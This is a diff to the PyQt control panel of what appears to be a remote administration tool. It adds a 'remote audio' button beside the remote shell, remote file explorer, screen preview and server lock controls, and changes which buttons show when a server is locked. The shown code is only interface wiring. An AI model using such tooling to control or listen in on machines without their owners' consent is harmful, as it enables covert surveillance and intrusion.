@@ -57,6 +57,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         # disable panel buttons
         self.remoteShellButton.setDisabled(True)
         self.remoteExplorerButton.setDisabled(True)
+        self.remoteAudioButton.setDisabled(True)
         self.lockServerButton.setDisabled(True)
         self.quitServerButton.setDisabled(True)
         self.unlockServerButton.setDisabled(True)
@@ -93,6 +94,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         self.unlockServerButton.clicked.connect(self.unlockServer)
         self.remoteShellButton.clicked.connect(self.runShell)
         self.remoteExplorerButton.clicked.connect(self.runExplorer)
+        self.remoteAudioButton.clicked.connect(self.runAudio)
         self.lockServerButton.clicked.connect(self.lockServer)
         self.quitServerButton.clicked.connect(self.lockServer)
 
@@ -365,24 +367,33 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
     def updatePanel(self):
         try:
             if self.serversTable.item(self.serversTable.currentRow(), self.index_of_lock).text() == 'LOCKED':
+                self.unlockServerButton.setVisible(True)
                 self.unlockServerButton.setDisabled(False)
                 self.updatePreviewButton.setDisabled(False)
                 self.remoteExplorerButton.setDisabled(True)
                 self.remoteShellButton.setDisabled(True)
+                self.remoteAudioButton.setDisabled(True)
+                self.lockServerButton.setVisible(False)
                 self.lockServerButton.setDisabled(True)
                 self.quitServerButton.setDisabled(True)
             else:
                 self.remoteExplorerButton.setDisabled(False)
                 self.remoteShellButton.setDisabled(False)
+                self.remoteAudioButton.setDisabled(False)
+                self.lockServerButton.setVisible(True)
                 self.lockServerButton.setDisabled(False)
                 self.quitServerButton.setDisabled(False)
+                self.unlockServerButton.setVisible(False)
                 self.unlockServerButton.setDisabled(True)
                 self.updatePreviewButton.setDisabled(False)
         except:
             self.remoteExplorerButton.setDisabled(True)
             self.remoteShellButton.setDisabled(True)
+            self.remoteAudioButton.setDisabled(True)
+            self.lockServerButton.setVisible(False)
             self.lockServerButton.setDisabled(True)
             self.quitServerButton.setDisabled(True)
+            self.unlockServerButton.setVisible(True)
             self.unlockServerButton.setDisabled(True)
             self.updatePreviewButton.setDisabled(True)
             self.previewLabel.setPixmap(QPixmap(os.path.join(self.assets, 'monitor.png')).scaled(QSize(280, 175)))
